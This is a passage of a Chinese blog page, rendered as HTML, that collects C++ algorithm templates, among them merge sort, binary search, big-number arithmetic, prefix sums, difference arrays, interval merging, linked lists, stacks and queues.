class="hljs-number">1</span>, r);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-归并排序"><a href="#1-2-归并排序" class="headerlink" title="1.2 归并排序"></a>1.2 归并排序</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> q[], <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>    merge_sort(q, l, mid);<br>    merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br><br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>        <span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ];<br>        <span class="hljs-keyword">else</span> tmp[k ++ ] = q[j ++ ];<br><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];<br><br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-整数二分"><a href="#1-3-整数二分" class="headerlink" title="1.3 整数二分"></a>1.3 整数二分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<span class="hljs-comment">/* ... */</span>&#125; <span class="hljs-comment">// 检查x是否满足某种性质</span><br><br><span class="hljs-comment">// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bsearch_1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-keyword">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (check(mid)) r = mid;    <span class="hljs-comment">// check()判断mid是否满足性质</span><br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br><span class="hljs-comment">// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bsearch_2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-keyword">int</span> mid = l + r + <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (check(mid)) l = mid;<br>        <span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-4-浮点数二分"><a href="#1-4-浮点数二分" class="headerlink" title="1.4 浮点数二分"></a>1.4 浮点数二分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">double</span> x)</span> </span>&#123;<span class="hljs-comment">/* ... */</span>&#125; <span class="hljs-comment">// 检查x是否满足某种性质</span><br><br><span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">bsearch_3</span><span class="hljs-params">(<span class="hljs-keyword">double</span> l, <span class="hljs-keyword">double</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">double</span> eps = <span class="hljs-number">1e-6</span>;   <span class="hljs-comment">// eps 表示精度，取决于题目对精度的要求</span><br>    <span class="hljs-keyword">while</span> (r - l &gt; eps)<br>    &#123;<br>        <span class="hljs-keyword">double</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (check(mid)) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid;<br>    &#125;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-5-高精度加法"><a href="#1-5-高精度加法" class="headerlink" title="1.5 高精度加法"></a>1.5 高精度加法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// C = A + B, A &gt;= 0, B &gt;= 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (A.size() &lt; B.size()) <span class="hljs-keyword">return</span> add(B, A);<br><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; A.size(); i ++ )<br>    &#123;<br>        t += A[i];<br>        <span class="hljs-keyword">if</span> (i &lt; B.size()) t += B[i];<br>        C.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (t) C.push_back(t);<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-6-高精度减法"><a href="#1-6-高精度减法" class="headerlink" title="1.6 高精度减法"></a>1.6 高精度减法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>; i &lt; A.size(); i ++ )<br>    &#123;<br>        t = A[i] - t;<br>        <span class="hljs-keyword">if</span> (i &lt; B.size()) t -= B[i];<br>        C.push_back((t + <span class="hljs-number">10</span>) % <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (t &lt; <span class="hljs-number">0</span>) t = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> t = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-7-高精度乘低精度"><a href="#1-7-高精度乘低精度" class="headerlink" title="1.7 高精度乘低精度"></a>1.7 高精度乘低精度</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// C = A * b, A &gt;= 0, b &gt;= 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br><br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; A.size() || t; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; A.size()) t += A[i] * b;<br>        C.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-8-高精度除以低精度"><a href="#1-8-高精度除以低精度" class="headerlink" title="1.8 高精度除以低精度"></a>1.8 高精度除以低精度</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// A / b = C ... r, A &gt;= 0, b &gt; 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">div</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> &amp;r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br>    r = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = A.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>    &#123;<br>        r = r * <span class="hljs-number">10</span> + A[i];<br>        C.push_back(r / b);<br>        r %= b;<br>    &#125;<br>    reverse(C.begin(), C.end());<br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-9-一维前缀和"><a href="#1-9-一维前缀和" class="headerlink" title="1.9 一维前缀和"></a>1.9 一维前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">S[i] = a[<span class="hljs-number">1</span>] + a[<span class="hljs-number">2</span>] + ... a[i]<br>a[l] + ... + a[r] = S[r] - S[l - <span class="hljs-number">1</span>]<br></code></pre></div></td></tr></table></figure><h3 id="1-10-二维前缀和"><a href="#1-10-二维前缀和" class="headerlink" title="1.10 二维前缀和"></a>1.10 二维前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">S[i, j] = 第i行j列格子左上部分所有元素的和<br>以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：<br>S[x2, y2] - S[x1 - <span class="hljs-number">1</span>, y2] - S[x2, y1 - <span class="hljs-number">1</span>] + S[x1 - <span class="hljs-number">1</span>, y1 - <span class="hljs-number">1</span>]<br></code></pre></div></td></tr></table></figure><h3 id="1-11-一维差分"><a href="#1-11-一维差分" class="headerlink" title="1.11 一维差分"></a>1.11 一维差分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给区间[l, r]中的每个数加上c：B[l] += c, B[r + <span class="hljs-number">1</span>] -= c<br></code></pre></div></td></tr></table></figure><h3 id="1-12-二分差分"><a href="#1-12-二分差分" class="headerlink" title="1.12 二分差分"></a>1.12 二分差分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：<br>S[x1, y1] += c, S[x2 + <span class="hljs-number">1</span>, y1] -= c, S[x1, y2 + <span class="hljs-number">1</span>] -= c, S[x2 + <span class="hljs-number">1</span>, y2 + <span class="hljs-number">1</span>] += c<br></code></pre></div></td></tr></table></figure><h3 id="1-13-位运算"><a href="#1-13-位运算" class="headerlink" title="1.13 位运算"></a>1.13 位运算</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">求n的第k位数字: n &gt;&gt; k &amp; <span class="hljs-number">1</span><br>返回n的最后一位<span class="hljs-number">1</span>：lowbit(n) = n &amp; -n<br></code></pre></div></td></tr></table></figure><h3 id="1-14-双指针"><a href="#1-14-双指针" class="headerlink" title="1.14 双指针"></a>1.14 双指针</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (j &lt; i &amp;&amp; check(i, j)) j ++ ;<br><br>    <span class="hljs-comment">// 具体问题的逻辑</span><br>&#125;<br>常见问题分类：<br>    (<span class="hljs-number">1</span>) 对于一个序列，用两个指针维护一段区间<br>    (<span class="hljs-number">2</span>) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作<br></code></pre></div></td></tr></table></figure><h3 id="1-15-离散发"><a href="#1-15-离散发" class="headerlink" title="1.15 离散发"></a>1.15 离散发</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; alls; <span class="hljs-comment">// 存储所有待离散化的值</span><br>sort(alls.begin(), alls.end()); <span class="hljs-comment">// 将所有值排序</span><br>alls.erase(unique(alls.begin(), alls.end()), alls.end());   <span class="hljs-comment">// 去掉重复元素</span><br><br><span class="hljs-comment">// 二分求出x对应的离散化的值</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> <span class="hljs-comment">// 找到第一个大于等于x的位置</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-keyword">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// 映射到1, 2, ...n</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-16-区间和并"><a href="#1-16-区间和并" class="headerlink" title="1.16 区间和并"></a>1.16 区间和并</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 将所有存在交集的区间合并</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;PII&gt; &amp;segs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;PII&gt; res;<br><br>    sort(segs.begin(), segs.end());<br><br>    <span class="hljs-keyword">int</span> st = <span class="hljs-number">-2e9</span>, ed = <span class="hljs-number">-2e9</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> seg : segs)<br>        <span class="hljs-keyword">if</span> (ed &lt; seg.first)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br>            st = seg.first, ed = seg.second;<br>        &#125;<br>        <span class="hljs-keyword">else</span> ed = max(ed, seg.second);<br><br>    <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br><br>    segs = res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="二-数据结构"><a href="#二-数据结构" class="headerlink" title="二.数据结构"></a>二.数据结构</h2><h3 id="2-1-单链表"><a href="#2-1-单链表" class="headerlink" title="2.1 单链表"></a>2.1 单链表</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点</span><br><span class="hljs-keyword">int</span> head, e[N], ne[N], idx;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head = <span class="hljs-number">-1</span>;<br>    idx = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 在链表头插入一个数a</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx] = a, ne[idx] = head, head = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 将头结点删除，需要保证头结点存在</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head = ne[head];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-双链表"><a href="#2-2-双链表" class="headerlink" title="2.2 双链表"></a>2.2 双链表</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点</span><br><span class="hljs-keyword">int</span> e[N], l[N], r[N], idx;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//0是左端点，1是右端点</span><br>    r[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>, l[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    idx = <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-comment">// 在节点a的右边插入一个数x</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx] = x;<br>    l[idx] = a, r[idx] = r[a];<br>    l[r[a]] = idx, r[a] = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 删除节点a</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    l[r[a]] = l[a];<br>    r[l[a]] = r[a];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-3-栈"><a href="#2-3-栈" class="headerlink" title="2.3 栈"></a>2.3 栈</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// tt表示栈顶</span><br><span class="hljs-keyword">int</span> stk[N], tt = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 向栈顶插入一个数</span><br>stk[ ++ tt] = x;<br><br><span class="hljs-comment">// 从栈顶弹出一个数</span><br>tt -- ;<br><br><span class="hljs-comment">// 栈顶的值</span><br>stk[tt];<br><br><span class="hljs-comment">// 判断栈是否为空</span><br><span class="hljs-keyword">if</span> (tt &gt; <span class="hljs-number">0</span>)<br>&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-队列"><a href="#2-4-队列" class="headerlink" title="2.4 队列"></a>2.4 队列</h3><h4 id="2-4-1-普通队列"><a href="#2-4-1-普通队列" class="headerlink" title="2.4.1 普通队列"></a>2.4.1 普通队列</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// hh 表示队头，tt表示队尾</span><br><span class="hljs-keyword">int</span> q[N], hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">// 向队尾插入一个数</span><br>q[ ++ tt] = x;<br><br><span class="hljs-comment">// 从队头弹出一个数</span><br>hh ++ ;<br><br><span class="hljs-comment">// 队头的值</span><br>q[hh];<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-keyword">if</span> (hh &lt;= tt)<br>&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-4-2-循环队列"><a href="#2-4-2-循环队列" class="headerlink" title="2.4.2 循环队列"></a>2.4.2 循环队列</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// hh 表示队头，tt表示队尾的后一个位置</span><br><span class="hljs-keyword">int</span> q[N], hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 向队尾插入一个数</span><br>q[tt ++ ] = x;<br><span class="hljs-keyword">if</span> (tt == N) tt = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 从队头弹出一个数</span><br>hh ++ ;<br><span class="hljs-keyword">if</span> (hh == N) hh = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 